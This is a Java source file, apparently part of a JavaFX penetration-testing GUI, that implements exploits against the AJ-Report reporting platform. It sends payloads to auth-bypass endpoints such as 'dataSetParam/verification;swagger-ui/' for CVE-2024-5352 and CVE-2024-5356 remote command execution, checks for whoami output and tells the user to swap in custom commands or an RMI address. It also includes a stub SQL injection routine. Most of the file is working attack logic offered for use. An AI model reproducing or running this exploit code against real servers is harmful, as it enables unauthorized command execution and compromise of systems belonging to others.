package com.liev.clouds.exp;

import com.liev.clouds.payload.AjReportPayload;
import com.liev.clouds.utils.DataUtils;
import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.utils.HttpUtils;
import javafx.scene.control.TextArea;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Revcloud
 * @since 2024/7/26 15:07
 */
public class AjReportExp {

    public void processDetection(String url, List<String> postData, TextArea postTxt, TextArea outComeArea, TextArea responseArea) {
        // 这里可以添加实际的检测逻辑，当前仅为示例逻辑

        //TODO 调用所有方法


    }

    /**
     * CVE-2024-5352(任意命令执行)
     * @param url 目标URL
     * @param postDataList 用于测试的POST数据列表
     * @param postTxt 用于显示发送的POST数据的文本区域
     * @param outComeArea 用于显示检测结果的文本区域
     * @param responseArea 用于显示响应数据的文本区域
     * @return 是否检测到漏洞
     */
    public boolean processRce(String url, List<String> postDataList, TextArea postTxt, TextArea outComeArea, TextArea responseArea) {
        boolean exp = false;

        try {
            // 设置请求头
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json;charset=UTF-8");

            // 处理URL
            String trueUrl = url.endsWith("/") ? url + "dataSetParam/verification;swagger-ui/" : url + "/dataSetParam/verification;swagger-ui/";

            // 如果postDataList不为null，则直接使用postDataList进行测试
            if (postDataList != null) {
                for (String postData : postDataList) {
                    // 发送POST请求
                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);

                    // 获取响应体
                    String formattedResponseBody = response.getResponseBody();

                    // 将数据都显示在显示框中
                    String formattedPostData = DataUtils.formatJson(postData);
                    postTxt.setText(formattedPostData);

                    // 获取并格式化所有响应头
                    Map<String, String> responseHeaders = response.getResponseHeaders();
                    StringBuilder headersStringBuilder = new StringBuilder();
                    for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
                        headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
                    }
                    // 将响应头和响应体输出到responseArea
                    responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

                    // 在结果区域显示响应体
                    outComeArea.setText("自定义POST请求发送完毕!");

                    // 检查响应状态码是否为302，并处理重定向
                    if (response.getResponseCode() == 302) {
                        outComeArea.appendText("\n检测到302重定向，请检查URL和请求参数是否正确。");
                    }
                }
                return exp; // 跳出方法
            }

            // 如果postDataList为空，使用默认的payload列表进行测试
            postDataList = Arrays.asList(AjReportPayload.RCE_EXP, AjReportPayload.GORRVY_EXP, AjReportPayload.JNDI_EXP);

            for (String postData : postDataList) {
                // 发送POST请求
                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);

                // 获取响应体
                String formattedResponseBody = response.getResponseBody();

                if (postData.equals(AjReportPayload.RCE_EXP)) {
                    // 特殊处理AjReportPayload.RCE_EXP
                    String regex = "\"data\":\"(.*?)\"";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(formattedResponseBody);
                    if (matcher.find()) {
                        String dataValue = matcher.group(1);
                        if (dataValue != null && !dataValue.isEmpty()) {
                            String result = "[+]CVE-2024-5352任意命令执行漏洞存在! \nwhoami执行结果: " + dataValue + "\n需要执行其它命令请勾选POST请求然后修改命令！";
                            exp = true;

                            // 将数据都显示在显示框中
                            String formattedPostData = DataUtils.formatJson(postData);
                            postTxt.setText(formattedPostData);

                            outComeArea.setText(result);

                            // 获取并格式化所有响应头
                            Map<String, String> responseHeaders = response.getResponseHeaders();
                            StringBuilder headersStringBuilder = new StringBuilder();
                            for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
                                headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
                            }
                            // 将响应头和响应体输出到responseArea
                            responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

                            return exp; // 跳出方法
                        }
                    }
                } else {
                    // 其他payload使用原来的方式判断
                    String regex = "\"code\":\"(.*?)\"";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(formattedResponseBody);
                    String dataValue = "";
                    if (matcher.find()) {
                        dataValue = matcher.group(1);
                    }
                    if (dataValue.equals("4005")) {
                        // 漏洞存在，设置结果并跳出循环
                        String result = "[+]CVE-2024-5352任意命令执行漏洞存在! \n请勾选自定义POST请求然后在POST请求中自定义您的命令或RMI地址!";
                        exp = true;

                        // 将数据都显示在显示框中
                        String formattedPostData = DataUtils.formatJson(postData);
                        postTxt.setText(formattedPostData);

                        outComeArea.setText(result);

                        // 获取并格式化所有响应头
                        Map<String, String> responseHeaders = response.getResponseHeaders();
                        StringBuilder headersStringBuilder = new StringBuilder();
                        for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
                            headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
                        }
                        // 将响应头和响应体输出到responseArea
                        responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

                        return exp; // 跳出方法
                    }
                }
            }

            // 如果未检测到漏洞，输出结果
            outComeArea.setText("漏洞不存在!");

        } catch (Exception e) {
            outComeArea.setText("检测过程中出现错误: " + e.getMessage());
            e.printStackTrace();
        }

        return exp;
    }




    /**
     * CVE-2024-5356(任意命令执行) - 处理使用AjReportPayload.JS_EXP的情况
     * @param url 目标URL
     * @param postData 用于测试的POST数据
     * @param postTxt 用于显示发送的POST数据的文本区域
     * @param outComeArea 用于显示检测结果的文本区域
     * @param responseArea 用于显示响应数据的文本区域
     * @return 是否检测到漏洞
     */
    public boolean processJsExp(String url, String postData, TextArea postTxt, TextArea outComeArea, TextArea responseArea) {
        boolean exp = false;

        try {
            // 处理URL
            String trueUrl = url.endsWith("/") ? url + "dataSet/testTransform;swagger-ui/" : url + "/dataSet/testTransform;swagger-ui/";

            // 设置请求头
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json;charset=UTF-8");

            if(postData == null){
                postData = AjReportPayload.JS_EXP;
            }

            // 发送POST请求
            HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);

            // 获取响应体
            String formattedResponseBody = response.getResponseBody();

            // 将数据都显示在显示框中
            String formattedPostData = DataUtils.formatJson(postData);
            postTxt.setText(formattedPostData);

            // 获取并格式化所有响应头
            Map<String, String> responseHeaders = response.getResponseHeaders();
            StringBuilder headersStringBuilder = new StringBuilder();
            for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
                headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
            }
            // 将响应头和响应体输出到responseArea
            responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

            // 使用原来的方式判断
            String regex = "\"code\":\"(.*?)\"";
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(formattedResponseBody);
            String dataValue = "";
            if (matcher.find()) {
                dataValue = matcher.group(1);
            }
            if (dataValue.equals("4005")) {
                // 漏洞存在，设置结果并跳出循环
                String result = "[+]CVE-2024-5356任意命令执行漏洞存在! \n请勾选自定义POST请求然后在POST请求中自定义您的命令!";
                exp = true;

                outComeArea.setText(result);


                return exp; // 跳出方法
            }

            // 如果未检测到漏洞，输出结果
            outComeArea.setText("漏洞不存在!");

        } catch (Exception e) {
            outComeArea.setText("检测过程中出现错误: " + e.getMessage());
            e.printStackTrace();
        }

        return exp;
    }



    public boolean processSql(String url, List<String> postDataList, TextArea postTxt, TextArea outComeArea, TextArea responseArea){
        boolean exp = false;

        try {
            // 如果postDataList为空，使用默认的payload列表
            if (postDataList == null) {
                postDataList = Arrays.asList(AjReportPayload.SQL_EXP);
            }

            // 设置请求头
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json;charset=UTF-8");

            for (String postData : postDataList){
                // 根据不同的postData使用不同的URL
                String trueUrl;
                if (postData.equals(AjReportPayload.SQL_EXP)) {
                    trueUrl = url.endsWith("/") ? url + "dataSet/testTransform;swagger-ui/" : url + "/dataSet/testTransform;swagger-ui/";
                } else {
                    trueUrl = "";
                }
                // 发送POST请求
                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);

                // 获取响应体
                String formattedResponseBody = response.getResponseBody();

                //TODO

                outComeArea.setText("逻辑未完善");

                postTxt.setText(postData);
                // 获取并格式化所有响应头
                Map<String, String> responseHeaders = response.getResponseHeaders();
                StringBuilder headersStringBuilder = new StringBuilder();
                for (Map.Entry<String, String> entry : responseHeaders.entrySet()) {
                    headersStringBuilder.append(entry.getKey()).append(": ").append(entry.getValue()).append("\n");
                }
                // 将响应头和响应体输出到responseArea
                responseArea.setText(response.getResponseCode() + "\n" + headersStringBuilder.toString() + "\n" + formattedResponseBody);

            }



        }catch (Exception e){

            e.printStackTrace();
        }


        return exp;
    }

}
